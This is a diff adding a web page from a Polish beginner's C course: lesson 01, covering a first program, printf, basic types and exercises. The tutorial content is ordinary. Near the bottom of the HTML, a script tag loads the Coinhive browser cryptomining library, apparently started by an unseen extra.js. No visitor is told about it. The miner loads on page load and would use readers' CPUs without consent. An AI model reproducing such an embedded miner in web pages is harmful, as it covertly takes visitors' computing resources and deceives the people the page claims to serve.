@@ -1,0 +1,666 @@
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="Podstawy programowania w języku C/C++">
+      
+      
+        <link rel="canonical" href="https://akastrau.github.io/korepetycje-cpp/lesson01-p1/">
+      
+      
+        <meta name="author" content="Adrian Kastrau">
+      
+      
+        <link rel="shortcut icon" href="../assets/images/favicon.png">
+      
+      <meta name="generator" content="mkdocs-0.16.3, mkdocs-material-1.10.1">
+    
+    
+      
+        <title>Lekcja 01: Pierwszy program - Korepetycje - C++</title>
+      
+    
+    
+      <script src="../assets/javascripts/modernizr-e826f8942a.js"></script>
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application-a20f419c8e.css">
+      
+    
+    
+      
+        
+        
+        
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    
+    
+    
+  </head>
+  
+  
+  
+  
+    <body>
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="352" height="448" viewBox="0 0 352 448" id="bitbucket"><path fill="currentColor" d="M203.75 214.75q2 15.75-12.625 25.25t-27.875 1.5q-9.75-4.25-13.375-14.5t-.125-20.5 13-14.5q9-4.5 18.125-3t16 8.875 6.875 16.875zm27.75-5.25q-3.5-26.75-28.25-41T154 165.25q-15.75 7-25.125 22.125t-8.625 32.375q1 22.75 19.375 38.75t41.375 14q22.75-2 38-21t12.5-42zM291.25 74q-5-6.75-14-11.125t-14.5-5.5T245 54.25q-72.75-11.75-141.5.5-10.75 1.75-16.5 3t-13.75 5.5T60.75 74q7.5 7 19 11.375t18.375 5.5T120 93.75Q177 101 232 94q15.75-2 22.375-3t18.125-5.375T291.25 74zm14.25 258.75q-2 6.5-3.875 19.125t-3.5 21-7.125 17.5-14.5 14.125q-21.5 12-47.375 17.875t-50.5 5.5-50.375-4.625q-11.5-2-20.375-4.5T88.75 412 70.5 401.125t-13-15.375q-6.25-24-14.25-73l1.5-4 4.5-2.25q55.75 37 126.625 37t126.875-37q5.25 1.5 6 5.75t-1.25 11.25-2 9.25zM350.75 92.5q-6.5 41.75-27.75 163.75-1.25 7.5-6.75 14t-10.875 10T291.75 288q-63 31.5-152.5 22-62-6.75-98.5-34.75-3.75-3-6.375-6.625t-4.25-8.75-2.25-8.5-1.5-9.875T25 232.75q-2.25-12.5-6.625-37.5t-7-40.375T5.5 118 0 78.5Q.75 72 4.375 66.375T12.25 57t11.25-7.5T35 43.875t12-4.625q31.25-11.5 78.25-16 94.75-9.25 169 12.5Q333 47.25 348 66.25q4 5 4.125 12.75t-1.375 13.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
+    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://akastrau.github.io/korepetycje-cpp/" title="Korepetycje - C++" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon md-icon--home"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <span class="md-flex__ellipsis md-header-nav__title">
+          
+            
+              
+                <span class="md-header-nav__parent">
+                  Pierwsza część - język C
+                </span>
+              
+            
+            Lekcja 01: Pierwszy program
+          
+        </span>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="search"></label>
+  <div class="md-search__inner">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" required placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query">
+      <label class="md-icon md-search__icon" for="search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset">&#xE5CD;</button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result" data-md-lang-search="" data-md-lang-tokenizer="[\s\-]+">
+          <div class="md-search-result__meta" data-md-lang-result-none="No matching documents" data-md-lang-result-one="1 matching document" data-md-lang-result-other="# matching documents">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://bitbucket.org/akastrau/korepetycje-c" title="Go to repository" class="md-source" data-md-source="bitbucket">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#bitbucket" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      Materiały na BitBucket
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href=".." title="Strona główna" class="md-tabs__link">
+        Strona główna
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../c/" title="Pierwsza część - język C" class="md-tabs__link md-tabs__link--active">
+          Pierwsza część - język C
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="drawer">
+    <div class="md-nav__button md-logo">
+      
+        <i class="md-icon md-icon--home"></i>
+      
+    </div>
+    Korepetycje - C++
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://bitbucket.org/akastrau/korepetycje-c" title="Go to repository" class="md-source" data-md-source="bitbucket">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#bitbucket" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      Materiały na BitBucket
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." title="Strona główna" class="md-nav__link">
+      Strona główna
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Pierwsza część - język C
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Pierwsza część - język C
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../c/" title="Część pierwsza kursu - podstawy programowania w języku C" class="md-nav__link">
+      Część pierwsza kursu - podstawy programowania w języku C
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="toc">
+        Lekcja 01: Pierwszy program
+      </label>
+    
+    <a href="./" title="Lekcja 01: Pierwszy program" class="md-nav__link md-nav__link--active">
+      Lekcja 01: Pierwszy program
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#jak-zaczac" title="Jak zacząć" class="md-nav__link">
+    Jak zacząć
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#no-to-jazda-jazda-jazda-trojkat-gwiazda" title="No to jazda, jazda, jazda, trójkąt, gwiazda!" class="md-nav__link">
+    No to jazda, jazda, jazda, trójkąt, gwiazda!
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#funkcja-main-punkt-startowy-naszej-aplikacji" title="Funkcja main - punkt startowy naszej aplikacji" class="md-nav__link">
+    Funkcja main - punkt startowy naszej aplikacji
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#no-dobra-mam-funkcje-main-i-co-dalej" title="No dobra! Mam funkcje main i co dalej?" class="md-nav__link">
+    No dobra! Mam funkcje main i co dalej?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kilka-sow-o-typach-w-c" title="Kilka słów o typach w C" class="md-nav__link">
+    Kilka słów o typach w C
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#funkcja-printf" title="Funkcja printf()" class="md-nav__link">
+    Funkcja printf()
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#na-zakonczenie-return-its_the_end" title="Na zakończenie - return ITS_THE_END" class="md-nav__link">
+    Na zakończenie - return ITS_THE_END
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#praktyka-czyni-mistrza-czyli-zadania-do-zrobienia" title="Praktyka czyni mistrza... czyli zadania do zrobienia" class="md-nav__link">
+    Praktyka czyni mistrza... czyli zadania do zrobienia
+  </a>
+  
+</li>
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#jak-zaczac" title="Jak zacząć" class="md-nav__link">
+    Jak zacząć
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#no-to-jazda-jazda-jazda-trojkat-gwiazda" title="No to jazda, jazda, jazda, trójkąt, gwiazda!" class="md-nav__link">
+    No to jazda, jazda, jazda, trójkąt, gwiazda!
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#funkcja-main-punkt-startowy-naszej-aplikacji" title="Funkcja main - punkt startowy naszej aplikacji" class="md-nav__link">
+    Funkcja main - punkt startowy naszej aplikacji
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#no-dobra-mam-funkcje-main-i-co-dalej" title="No dobra! Mam funkcje main i co dalej?" class="md-nav__link">
+    No dobra! Mam funkcje main i co dalej?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kilka-sow-o-typach-w-c" title="Kilka słów o typach w C" class="md-nav__link">
+    Kilka słów o typach w C
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#funkcja-printf" title="Funkcja printf()" class="md-nav__link">
+    Funkcja printf()
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#na-zakonczenie-return-its_the_end" title="Na zakończenie - return ITS_THE_END" class="md-nav__link">
+    Na zakończenie - return ITS_THE_END
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#praktyka-czyni-mistrza-czyli-zadania-do-zrobienia" title="Praktyka czyni mistrza... czyli zadania do zrobienia" class="md-nav__link">
+    Praktyka czyni mistrza... czyli zadania do zrobienia
+  </a>
+  
+</li>
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="pierwsze-koty-za-poty-czyli-nasza-pierwsza-aplikacja-napisana-w-jezyku-c">Pierwsze koty za płoty... czyli nasza pierwsza aplikacja napisana w języku C<a class="headerlink" href="#pierwsze-koty-za-poty-czyli-nasza-pierwsza-aplikacja-napisana-w-jezyku-c" title="Permanent link">&para;</a></h1>
+<h2 id="jak-zaczac">Jak zacząć<a class="headerlink" href="#jak-zaczac" title="Permanent link">&para;</a></h2>
+<p>W Visual Studio tworzymy nowy projekt C++. Wybieramy <strong>Empty Project</strong>. Po utworzeniu nowego projektu musimy utworzyć nowy plik (niech to będzie plik <strong>Source.c</strong>). Rozszerzenie <strong>.c</strong> mówi nam o tym, że nasz kod źródłowy będzie pisany w języku C.</p>
+<p><center><img src="/img/hackerman-c.jpg" alt="Hackerman" width="60%" height="60%"></center>
+<center>Źródło: http://devhumor.com/media/i-can-write-quot-hello-world-quot-in-c</center></p>
+<h2 id="no-to-jazda-jazda-jazda-trojkat-gwiazda">No to jazda, jazda, jazda, trójkąt, gwiazda!<a class="headerlink" href="#no-to-jazda-jazda-jazda-trojkat-gwiazda" title="Permanent link">&para;</a></h2>
+<p>Napiszmy:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">variable</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello! Your number is %i!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;pause&quot;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></table>
+
+<p>Co tutaj się stało? W pierwszej linijce napisalismy <code>#include &lt;stdio.h&gt;</code>. Oznacza to, że kompilator dołączy za nas biblioteke <strong>stdio.h</strong>. W drugiej zaś biblioteke <strong>stdlib.h</strong>.</p>
+<p>Dlaczego te biblioteki dołączyliśmy? Pierwsza z nich to <em>STanDard Input Output library</em>. Znajdziemy w niej podstawowe funkcje wejścia/wyjścia (takie jak wypisywanie tekstu na ekran). Z kolei <strong>stdlib.h</strong> to <em>STanDard LIBrary</em>. Znajdziemy w niej postawowe stałe i makra takie jak <code>EXIT_SUCCESS</code>.</p>
+<div class="admonition tip">
+<p class="admonition-title">Ciekawostka</p>
+<p>Makro <code>EXIT_SUCCESS</code> to pewna stała.
+W bibliotece standardowej stała <code>EXIT_SUCCESS</code> przyjmuje wartość <code>0</code>
+Istnieje także makro <code>EXIT_FAILURE</code>, które definiuje wartość <code>1</code>.</p>
+</div>
+<h2 id="funkcja-main-punkt-startowy-naszej-aplikacji">Funkcja main - punkt startowy naszej aplikacji<a class="headerlink" href="#funkcja-main-punkt-startowy-naszej-aplikacji" title="Permanent link">&para;</a></h2>
+<p>Aby nasz program mógł się uruchomić, kompilator musi wiedzieć w jakim miejscu zaczyna wykonywać się nasza aplikacja. Takim miejscem jest funcja <strong>main</strong>. O funkcjach opowiemy sobie w innej lekcji. Na tym etapie zwróć uwage na definicje naszej funkcji startowej:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// To jest nasza funkcja glowna</span>
+    <span class="k">return</span> <span class="n">jakas_liczba</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></table>
+
+<p>Co oznacza słówko kluczowe <strong>int</strong>? Oznacza to tyle, że funkcja po zakończeniu swojego działania zwraca typ zmiennej typu <strong>int</strong>. O typach zmiennych opowiemy sobie za moment.</p>
+<h2 id="no-dobra-mam-funkcje-main-i-co-dalej">No dobra! Mam funkcje main i co dalej?<a class="headerlink" href="#no-dobra-mam-funkcje-main-i-co-dalej" title="Permanent link">&para;</a></h2>
+<p>Przyjrzyjmy się jeszcze raz na nasz kod źródłowy z początku lekcji. </p>
+<p>W linii numer 6 zadeklarowaliśmy zmienną typu <strong>int</strong> o nazwie <strong>variable</strong>. Dzięki takiej deklaracji możemy użyć naszej zmiennej w obrębie naszej funkcji (jest to zmienna lokalna). </p>
+<p>W kolejnej linijce użyliśmy funkcji wbudowanej <code>printf()</code> (printf to skrót od <em>print formatted</em>). Wyświetla ona sformatowany tekst. Spójrzmy na pierwszy argument, który wchodzi do naszej funkcji:
+<code>"Hello! Your number is %i!\n"</code>. Jest to tekst, który zostanie wyświetlony na ekranie. <code>%i</code> oznacza, że kompilator podstawi tu zmienną typu <strong>int</strong>. <code>\n</code> na końcu naszego tekstu oznacza znak nowej linii (z ang. <em>newline</em>). Jako drugi argument w funkcji <code>printf()</code> podaliśmy zmienną <strong>variable</strong>. Dzięki temu funkcja <code>printf()</code> podstawi wartość zmiennej pod <code>%i</code>.</p>
+<p>W linii numer 8 użyliśmy funkcji <code>system()</code>. Funkcja ta wywołuje polecenie systemowe (w naszym przypadku jest to polecenie <code>pause</code>, które zatrzymuje działanie naszego programu i oczekuje na wciśnięcie dowolnego klawisza). Niestety polecenie <code>pause</code> działa tylko w systemach Windows. W przypadku innych systemów musimy użyć innego rozwiązania, żeby zatrzymać działanie programu.</p>
+<p>W ostatniej linii napisaliśmy <code>return 0</code> co oznacza, że program zwróci liczbe 0 po zakończeniu działania.</p>
+<h2 id="kilka-sow-o-typach-w-c">Kilka słów o typach w C<a class="headerlink" href="#kilka-sow-o-typach-w-c" title="Permanent link">&para;</a></h2>
+<p>Mamy klika rodzajów zmiennych. Są to zmienne:
+- typu <strong>int</strong>, czyli liczby całkowite 32-bitowe,
+- typu <strong>float</strong>, czyli liczby zmiennoprzecinkowe pojedyńczej precyzji,
+- typu <strong>double</strong>, czyli liczby zmiennoprzecinkowe podwójnej precyzji,
+- typu <strong>char</strong>, czyli znak/litera lub <strong>char</strong>* w przypadku łancuchu znaków, czyli tekstu.</p>
+<p>Oczywiście mamy jeszcze wariant ze słowem <strong>long</strong>, ale na tym etapie nie będę o nim wspominać.</p>
+<div class="admonition note">
+<p class="admonition-title">Więcej o typach podstawowych</p>
+<p>Więcej informacji na temat typów podstawowych znajdziesz na przykład <a href="https://msdn.microsoft.com/en-us/library/cc953fe1.aspx">tu</a>.</p>
+</div>
+<h2 id="funkcja-printf">Funkcja printf()<a class="headerlink" href="#funkcja-printf" title="Permanent link">&para;</a></h2>
+<p>Przy wywołaniu funkcji <code>printf()</code> skorzystaliśmy z <code>%i</code>. Jest to tzw. <em>format specifier</em>. Na podstawie dokumentacji z <a href="../cplusplus.com/reference/">cplusplus.com</a> wymienimy kilka dostępnych formatów wyświetlanych danych. Między innymi są to:
+- <code>%i</code> lub <code>%d</code> dla liczb typu całkowitego,
+- <code>%f</code> dla liczby zmiennoprzecinkowych,
+- <code>%c</code> dla pojedynczego znaku,
+- <code>%s</code> dla łańcucha znaku.</p>
+<p>W funkcji <code>printf()</code> można użyć specjalnych znaków za pomocą <code>\</code> (przykład <code>\n</code>). Zachęcam do poczytania dokumentacji tej funkcji.</p>
+<h2 id="na-zakonczenie-return-its_the_end">Na zakończenie - return ITS_THE_END<a class="headerlink" href="#na-zakonczenie-return-its_the_end" title="Permanent link">&para;</a></h2>
+<p>Słówko kluczowe <code>return</code> w funkcji <code>main()</code> wykorzystujemy po to, aby zasygnalizować stan wykonania naszego programu. Zwykle zwraca się:
+- <code>0</code>, gdy program zakończył sie poprawnie,
+- <code>1</code> lub liczbe ujemną gdy program zakończył się porażką.</p>
+<h2 id="praktyka-czyni-mistrza-czyli-zadania-do-zrobienia">Praktyka czyni mistrza... czyli zadania do zrobienia<a class="headerlink" href="#praktyka-czyni-mistrza-czyli-zadania-do-zrobienia" title="Permanent link">&para;</a></h2>
+<p>Kod do zadania wygląda następująco:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">float</span> <span class="n">pi</span> <span class="o">=</span> <span class="mf">3.14159265</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">text</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;Some text here&quot;</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="mi">1246754</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">numerical_value</span> <span class="o">=</span> <span class="mf">2674.3236434664311</span><span class="p">;</span>
+
+    <span class="c1">// Uzupelnij kod</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;pause&quot;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></table>
+
+<p>Zadania:</p>
+<ol>
+<li>Wyświetl liczbe pi z dokładnością do trzeciego miejsca po przecinku,</li>
+<li>Wyświetl znak 1, 3 i 8 z łancucha <strong>text</strong>,</li>
+<li>Wyświetli liczbe <strong>number</strong> zaokrąglając ją do piątego miejsca,</li>
+<li>Wyświetl liczbę <strong>numerical_value</strong> w następujący sposób:<ul>
+<li>część całkowitą zaokrąglij do drugiego miejsca,</li>
+<li>część ułamkową zaokrąglij do ósmego miejsca po przecinku.</li>
+</ul>
+</li>
+</ol>
+                
+                  
+                
+              
+              
+                
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../c/" title="Część pierwsza kursu - podstawy programowania w języku C" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Część pierwsza kursu - podstawy programowania w języku C
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Adrian Kastrau 2017
+          </div>
+        
+        powered by
+        <a href="http://www.mkdocs.org" title="MkDocs">MkDocs</a>
+        and
+        <a href="http://squidfunk.github.io/mkdocs-material/" title="Material for MkDocs">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application-f3ab9e5ff8.js"></script>
+      
+      
+      <script>app.initialize({url:{base:".."}})</script>
+      
+        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+      
+        <script src="../js/extra.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
